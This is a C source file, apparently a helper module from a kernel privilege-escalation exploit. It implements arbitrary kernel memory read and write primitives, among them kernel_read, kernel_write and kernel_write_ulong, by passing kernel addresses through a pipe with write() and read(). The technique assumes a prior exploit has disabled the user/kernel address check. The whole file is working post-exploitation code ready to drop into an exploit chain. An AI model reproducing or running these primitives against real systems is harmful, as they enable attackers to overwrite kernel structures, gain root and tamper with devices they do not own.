#include <stdio.h>
#include <unistd.h>

#include "kernel_rw.h"

int32_t check_kernel_memory_valid(uint64_t pAddr, uint64_t ulSz)
{
    int32_t iRet = -1;
    char szData[PAGE_SIZE] = {0};

    if(0 != (ulSz % 0x1000))
    {
        printf("[-] memory size is not page aligend!\n");
        goto done;
    }

    for(int32_t i = 0; i < (ulSz/PAGE_SIZE); i++)
    {
        if(PAGE_SIZE != kernel_read(pAddr + i*PAGE_SIZE, szData, PAGE_SIZE))
        {
            printf("[-] failed to read memory!\n");
            goto done;
        }
    }

    iRet = 0;

done:

    return iRet;
}

int32_t kernel_read(uint64_t pAddr, void* pRecvBuff, uint64_t ulSz)
{
    int32_t iRet = -1;
    int32_t iPipeFd[2] = {0};

    if(0 != pipe(iPipeFd))
    {
        printf("[-] failed to create kernel r/w pipes!\n");
        goto done;
    }

    if(ulSz != write(iPipeFd[1], (void*)pAddr, ulSz))
    {
        printf("[-] error writing to kernel pipe!\n");
        goto done;
    }

    iRet = read(iPipeFd[0], pRecvBuff, ulSz);

done:
    
    close(iPipeFd[0]);
    close(iPipeFd[1]);

    return iRet;
}

uint8_t kernel_read_uchar(uint64_t pAddr)
{
    uint8_t ucData = 0x0;

    if(sizeof(uint8_t) != kernel_read(pAddr, &ucData, sizeof(uint8_t)))
    {
        printf("[-] failed to read from the kernel!\n");
        ucData = 0x0;
    }

    return ucData;
}

uint32_t kernel_read_uint(uint64_t pAddr)
{
    uint32_t uiData = 0;

    if(sizeof(uint32_t) != kernel_read(pAddr, &uiData, sizeof(uint32_t)))
    {
        printf("[] failed to read from the kernel!\n");
        uiData = 0;
    }

    return uiData;
}

uint64_t kernel_read_ulong(uint64_t pAddr)
{
    uint64_t ulData = 0;

    if(sizeof(uint64_t) != kernel_read(pAddr, &ulData, sizeof(uint64_t)))
    {
        printf("[-] failed to read from the kernel!\n");
        ulData = 0;
    }

    return ulData;
}

int32_t kernel_write(uint64_t pAddr, void* pDataBuff, uint64_t ulSz)
{
    int32_t iRet = -1;
    int32_t iPipeFd[2] = {0};

    if(0 != pipe(iPipeFd))
    {
        printf("[-] failed to create kernel r/w pipes!\n");
        goto done;
    }

    if(ulSz != write(iPipeFd[1], pDataBuff, ulSz))
    {
        printf("[-] error writing to kernel pipe!\n");
        goto done;
    }

    iRet = read(iPipeFd[0], (void*)pAddr, ulSz);

done:

    close(iPipeFd[0]);
    close(iPipeFd[1]);

    return iRet;
}

int32_t kernel_write_uint(uint64_t pAddr, uint32_t uiValue)
{
    int32_t iRet = -1;

    iRet = kernel_write(pAddr, &uiValue, sizeof(uint32_t));

    return iRet;
}

int32_t kernel_write_ulong(uint64_t pAddr, uint64_t ulValue)
{
    int32_t iRet = -1;

    iRet = kernel_write(pAddr, &ulValue, sizeof(uint64_t));

    return iRet;
}